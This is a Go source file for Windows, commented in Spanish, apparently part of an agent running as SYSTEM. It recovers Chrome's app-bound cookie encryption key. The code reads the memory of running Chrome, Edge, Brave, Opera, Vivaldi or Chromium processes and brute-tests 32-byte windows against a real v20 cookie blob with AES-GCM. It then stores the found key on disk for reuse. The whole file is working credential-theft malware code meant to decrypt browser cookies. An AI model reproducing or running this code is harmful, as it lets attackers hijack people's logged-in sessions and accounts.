//go:build windows

package win32

import (
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
	"unsafe"

	"github.com/local/govoid/internal/config"
	"golang.org/x/sys/windows"
)

// Chrome 127+ cifra las cookies con una clave app-bound (prefijo v20) que solo
// entrega su servicio de elevación, y lo hace solo a chrome.exe firmado. La
// clave no se puede desenvolver en disco: el blob de Local State acaba en un
// material de 133 bytes que el servicio descifra con su propio secreto.
//
// Lo que sí se puede hacer es leerla de la memoria del navegador, que la
// mantiene mientras tiene la base de cookies abierta. GCM autentica, así que
// probar cada ventana de 32 bytes contra un blob real no da falsos positivos:
// la primera que abre es la clave.

const (
	memPrivate       = 0x20000
	memMapped        = 0x40000
	maxScanBytes     = 2 << 30 // 2 GB: un navegador normal no llega ahí
	maxScanDuration  = 90 * time.Second
	scanChunk        = 16 << 20
	appBoundKeyBytes = 32
)

var sizeOfMemoryInfo = unsafe.Sizeof(windows.MemoryBasicInformation{})

var (
	appBoundMu    sync.Mutex
	appBoundCache = map[string][]byte{}
)

// firstAppBound devuelve el primer blob v20 de las filas, que sirve de muestra
// para validar una clave candidata: GCM autentica, así que solo la clave real
// lo abre.
func firstAppBound(rows [][]SQLiteValue, blobIndex int) []byte {
	for _, row := range rows {
		if len(row) <= blobIndex {
			continue
		}
		blob := row[blobIndex].Blob
		if len(blob) >= 3+12+16 && string(blob[:3]) == "v20" {
			return blob
		}
	}
	return nil
}

// AppBoundKey devuelve la clave app-bound de un navegador para el blob de
// muestra. La clave es estable por instalación: se guarda en disco y se
// reutiliza. El blob de muestra es la prueba —GCM autentica—, así que una clave
// vieja se descarta sola y se vuelve a barrer la memoria del navegador.
func AppBoundKey(browser string, sample []byte) ([]byte, error) {
	appBoundMu.Lock()
	defer appBoundMu.Unlock()

	if cached := appBoundCache[browser]; len(cached) == 32 {
		if _, err := decryptGCMRaw(sample, cached); err == nil {
			return cached, nil
		}
		delete(appBoundCache, browser)
	}

	if stored := loadAppBoundKey(browser, sample); stored != nil {
		appBoundCache[browser] = stored
		return stored, nil
	}

	key, err := RecoverAppBoundKey(browser, sample)
	if err != nil {
		return nil, err
	}
	appBoundCache[browser] = key
	saveAppBoundKey(browser, key)
	return key, nil
}

// browserProcessName traduce el nombre del navegador al del ejecutable que
// mantiene la clave en memoria.
func browserProcessName(browser string) string {
	lower := strings.ToLower(browser)
	switch {
	case strings.Contains(lower, "brave"):
		return "brave.exe"
	case strings.Contains(lower, "edge"):
		return "msedge.exe"
	case strings.Contains(lower, "chromium"):
		return "chromium.exe"
	case strings.Contains(lower, "vivaldi"):
		return "vivaldi.exe"
	case strings.Contains(lower, "opera"):
		return "opera.exe"
	default:
		return "chrome.exe"
	}
}

// appBoundKeyPath es donde se guarda la clave ya recuperada. Vive en ProgramData
// porque el agente corre como SYSTEM y el barrido de memoria tiene que hacerse
// una sola vez por navegador.
func appBoundKeyPath(browser string) string {
	base := os.Getenv("ProgramData")
	if base == "" {
		base = os.Getenv("APPDATA")
	}
	name := "abekey_" + browserProcessName(browser) + ".bin"
	return filepath.Join(base, config.DataDirName, name)
}

// loadAppBoundKey lee la clave guardada y la valida contra el blob de muestra.
// Una clave de otra instalación no abre y se descarta.
func loadAppBoundKey(browser string, sample []byte) []byte {
	raw, err := os.ReadFile(appBoundKeyPath(browser))
	if err != nil || len(raw) != appBoundKeyBytes {
		return nil
	}
	if _, err := decryptGCMRaw(sample, raw); err != nil {
		return nil
	}
	key := make([]byte, appBoundKeyBytes)
	copy(key, raw)
	return key
}

// saveAppBoundKey deja la clave en disco para no repetir el barrido de memoria.
// Si falla no es un error: solo cuesta volver a buscarla.
func saveAppBoundKey(browser string, key []byte) {
	path := appBoundKeyPath(browser)
	if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
		return
	}
	_ = os.WriteFile(path, key, 0o600)
}

// RecoverAppBoundKey busca en la memoria de los procesos del navegador la clave
// que abre el blob v20 dado. Devuelve la clave de 32 bytes.
func RecoverAppBoundKey(browser string, sample []byte) ([]byte, error) {
	if len(sample) < 3+12+16 || string(sample[:3]) != "v20" {
		return nil, errors.New("chrome: se necesita un blob v20 para buscar la clave")
	}

	processName := browserProcessName(browser)
	pids, err := pidsByName(processName)
	if err != nil {
		return nil, err
	}
	if len(pids) == 0 {
		return nil, fmt.Errorf("chrome: %s no está corriendo, sin clave app-bound", processName)
	}

	deadline := time.Now().Add(maxScanDuration)
	var scanned int64
	var lastErr error

	for _, pid := range pids {
		if time.Now().After(deadline) || scanned > maxScanBytes {
			break
		}
		process, openErr := windows.OpenProcess(
			windows.PROCESS_VM_READ|windows.PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
		if openErr != nil {
			lastErr = openErr
			continue
		}
		key, bytes, scanErr := scanProcessForKey(process, sample, deadline)
		_ = windows.CloseHandle(process)
		scanned += bytes
		if key != nil {
			return key, nil
		}
		if scanErr != nil {
			lastErr = scanErr
		}
	}

	if lastErr != nil {
		return nil, fmt.Errorf("chrome: clave app-bound no encontrada: %w", lastErr)
	}
	return nil, errors.New("chrome: clave app-bound no encontrada en memoria")
}

// scanProcessForKey recorre las regiones privadas legibles del proceso y prueba
// cada ventana alineada de 32 bytes contra el blob.
func scanProcessForKey(process windows.Handle, sample []byte, deadline time.Time) ([]byte, int64, error) {
	var info windows.MemoryBasicInformation
	var address uintptr
	var total int64
	buf := make([]byte, scanChunk)

	for {
		if time.Now().After(deadline) {
			return nil, total, errors.New("tiempo de barrido agotado")
		}
		if err := windows.VirtualQueryEx(process, address, &info, sizeOfMemoryInfo); err != nil {
			break
		}
		base := info.BaseAddress
		size := info.RegionSize
		next := base + size
		if next <= address {
			break
		}
		address = next

		if info.State != windows.MEM_COMMIT {
			continue
		}
		if info.Type != memPrivate && info.Type != memMapped {
			continue
		}
		switch info.Protect & 0xFF {
		case windows.PAGE_READONLY, windows.PAGE_READWRITE, windows.PAGE_EXECUTE_READ,
			windows.PAGE_EXECUTE_READWRITE, windows.PAGE_WRITECOPY, windows.PAGE_EXECUTE_WRITECOPY:
		default:
			continue
		}
		if info.Protect&windows.PAGE_GUARD != 0 {
			continue
		}

		for offset := uintptr(0); offset < size; offset += scanChunk {
			want := size - offset
			if want > scanChunk {
				want = scanChunk
			}
			var read uintptr
			if err := windows.ReadProcessMemory(process, base+offset, &buf[0], want, &read); err != nil || read < 64 {
				continue
			}
			total += int64(read)
			data := buf[:read]

			for i := 0; i+appBoundKeyBytes <= len(data); i += 16 {
				key := data[i : i+appBoundKeyBytes]
				if _, err := decryptGCM(sample, key); err == nil {
					found := make([]byte, appBoundKeyBytes)
					copy(found, key)
					return found, total, nil
				}
			}
		}
	}
	return nil, total, nil
}
